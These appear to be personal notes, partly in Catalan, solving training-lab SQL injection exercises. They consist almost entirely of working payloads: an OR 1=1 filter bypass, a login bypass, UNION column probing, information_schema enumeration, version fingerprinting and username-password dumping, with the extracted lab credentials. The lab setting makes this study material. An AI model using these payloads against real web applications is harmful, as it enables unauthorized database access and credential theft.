### **Lab 1**: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

    /filter?category=Gifts' or 1=1-- -'

## **Lab 2**: SQL injection vulnerability allowing login bypass
1. administrator'-- -

2. filter?category=Gifts' union select NULL, NULL, NULL-- -

3. filter?category=Gifts' union select NULL,'1M2wiY',NULL-- -

4. Llistar TOTES les Bases de Dades:
	filter?category=Gifts' union select schema_name,NULL from information_schema.schemata-- -
   Llistar TOTES les Taules de totes les BBDD:
	filter?category=Gifts' union select table_name,NULL from information_schema.tables-- -
   Llistar TOTES les Taules d'1 BDD:
	filter?category=Gifts' union select table_name,NULL from information_schema.tables where table_schema='public'-- -
   Llistar TOTES les Columnes d'una taula i una BDD en concret:
	filter?category=Gifts' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users'-- -
   Llistar Dades de diferents maneres
	filter?category=Gifts' union select NULL,group_concat(username,':',password) from users-- -
	filter?category=Gifts' union select NULL,group_concat(username,0x3a,password) from users-- -     ---> Convertim els : en Hexadecimal
	filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = 'admin'-- -
	filter?category=Gifts' union select NULL,group_concat(username,':',password) from users where username = '0x61646d696e'-- -    ---> Convertim la paraula 'admin' en Hexadecimal

	Convertir 'admin' en Hexadecimal ==> echo "admin" | tr -d '\n' | xxd -ps

 	SOLVED: filter?category=Gifts' union select username,password from users-- -
	SOLVED: filter?category=Gifts' union select NULL,username||':'||password from users-- -
	OUTPUT: administrator:ria9b2ri5pwga9fk2s41

6.  filter?category=Gifts' union select NULL,username||':'||password from users-- -
    OUTPUT: administrator/lt7elzdb9kleb4bdfy9f

7.  filter?category=Gifts' union select NULL,banner from v$version-- -

8.  filter?category=Lifestyle' union select NULL,@@version-- -

9. filter?category=Accessories' union select NULL,table_name from information_schema.tables where table_schema='public'-- -
	OUTPUT: users_mozxmt, products
   filter?category=Accessories' union select column_name,NULL from information_schema.columns where table_schema='public' and table_name='users_mozxmt'-- -
	OUTPUT: password_imfrmo, username_blbbus
   filter?category=Accessories' union select username_blbbus,password_imfrmo from users_mozxmt-- -
	OUTPUT: administrator/4osd4u3aeqkfxw5z3zvk